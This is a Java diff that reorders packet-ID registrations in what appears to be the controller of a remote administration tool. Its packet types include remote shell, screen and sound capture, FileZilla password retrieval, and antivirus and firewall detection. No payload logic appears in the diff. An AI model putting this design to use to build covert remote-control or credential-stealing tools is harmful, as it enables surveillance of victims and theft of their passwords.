@@ -22,33 +22,47 @@ public class IncomingPackets {
 
 	private static void reload() {
 		incomingPackets.clear();
+
+		incomingPackets.put((byte) 5, Packet5InitUserHost.class);
+
+		incomingPackets.put((byte) 36, Packet36Initialized.class);
+		incomingPackets.put((byte) 30, Packet30InitVersion.class);
+		incomingPackets.put((byte) 31, Packet31InitInstallationDate.class);
+		incomingPackets.put((byte) 25, Packet25InitJavaVersion.class);
+		incomingPackets.put((byte) 26, Packet26InitJavaPath.class);
+		incomingPackets.put((byte) 23, Packet23InitInstallPath.class);
 		incomingPackets.put((byte) 10, Packet10InitDefaultLocale.class);
+		incomingPackets.put((byte) 15, Packet15InitServerID.class);
+		incomingPackets.put((byte) 16, Packet16InitOperatingSystem.class);
+		incomingPackets.put((byte) 47, Packet47InitCountry.class);
+		incomingPackets.put((byte) 28, Packet28InitLanAddress.class);
+		incomingPackets.put((byte) 61, Packet61InitMonitors.class);
+		incomingPackets.put((byte) 62, Packet62InitDrives.class);
+		incomingPackets.put((byte) 63, Packet63InitRAM.class);
+		incomingPackets.put((byte) 64, Packet64InitAvailableCores.class);
+		incomingPackets.put((byte) 69, Packet69InitAntivirus.class);
+		incomingPackets.put((byte) 70, Packet70InitFirewall.class);
+		
 		incomingPackets.put((byte) 11, Packet11InstalledLocales.class);
 		incomingPackets.put((byte) 12, Packet12Disconnect.class);
 		incomingPackets.put((byte) 13, Packet13Status.class);
-		incomingPackets.put((byte) 14, Packet14InitComputerName.class);
-		incomingPackets.put((byte) 15, Packet15InitServerID.class);
-		incomingPackets.put((byte) 16, Packet16InitOperatingSystem.class);
+		// 14 free
 		incomingPackets.put((byte) 17, Packet17RemoteScreen.class);
 		incomingPackets.put((byte) 18, Packet18OneRemoteScreen.class);
 		incomingPackets.put((byte) 19, Packet19ListFiles.class);
 		incomingPackets.put((byte) 20, Packet20Process.class);
 		incomingPackets.put((byte) 21, Packet21RemoteShell.class);
-		incomingPackets.put((byte) 22, Packet22InitUsername.class);
-		incomingPackets.put((byte) 23, Packet23InitInstallPath.class);
+		
 		incomingPackets.put((byte) 24, Packet24JVMMemory.class);
-		incomingPackets.put((byte) 25, Packet25InitJavaVersion.class);
-		incomingPackets.put((byte) 26, Packet26InitJavaPath.class);
+		
 		incomingPackets.put((byte) 27, Packet27URLStatus.class);
-		incomingPackets.put((byte) 28, Packet28InitLanAddress.class);
 		incomingPackets.put((byte) 29, Packet29ReceiveFile.class);
-		incomingPackets.put((byte) 30, Packet30InitVersion.class);
-		incomingPackets.put((byte) 31, Packet31InitInstallationDate.class);
+		
 		incomingPackets.put((byte) 32, Packet32SystemProperties.class);
 		incomingPackets.put((byte) 33, Packet33Thumbnail.class);
 		incomingPackets.put((byte) 34, Packet34CustomDirectory.class);
 		incomingPackets.put((byte) 35, Packet35ChatMessage.class);
-		incomingPackets.put((byte) 36, Packet36Initialized.class);
+		
 		incomingPackets.put((byte) 37, Packet37SearchResult.class);
 		incomingPackets.put((byte) 38, Packet38HostFile.class);
 		incomingPackets.put((byte) 39, Packet39HostEditResult.class);
@@ -59,7 +73,7 @@ public class IncomingPackets {
 		incomingPackets.put((byte) 44, Packet44SystemJavaProperty.class);
 		incomingPackets.put((byte) 45, Packet45ArchivePreview.class);
 		incomingPackets.put((byte) 46, Packet46FileHash.class);
-		incomingPackets.put((byte) 47, Packet47InitCountry.class);
+
 		incomingPackets.put((byte) 48, Packet48FileZillaPassword.class);
 		incomingPackets.put((byte) 49, Packet49LanDevices.class);
 		incomingPackets.put((byte) 50, Packet50IPConfig.class);
@@ -73,16 +87,12 @@ public class IncomingPackets {
 		incomingPackets.put((byte) 58, Packet58SoundCapture.class);
 		incomingPackets.put((byte) 59, Packet59ThumbnailPreview.class);
 		incomingPackets.put((byte) 60, Packet60Error.class);
-		incomingPackets.put((byte) 61, Packet61InitMonitors.class);
-		incomingPackets.put((byte) 62, Packet62InitDrives.class);
-		incomingPackets.put((byte) 63, Packet63InitRAM.class);
-		incomingPackets.put((byte) 64, Packet64InitAvailableCores.class);
+		
 		incomingPackets.put((byte) 65, Packet65ErrorLog.class);
 		incomingPackets.put((byte) 66, Packet66Config.class);
 		incomingPackets.put((byte) 67, Packet67LoadedPlugins.class);
 		incomingPackets.put((byte) 68, Packet68RemoteScreenComplete.class);
-		incomingPackets.put((byte) 69, Packet69InitAntivirus.class);
-		incomingPackets.put((byte) 70, Packet70InitFirewall.class);
+		
 		incomingPackets.put((byte) 71, Packet71AllThumbnails.class);
 	}
 
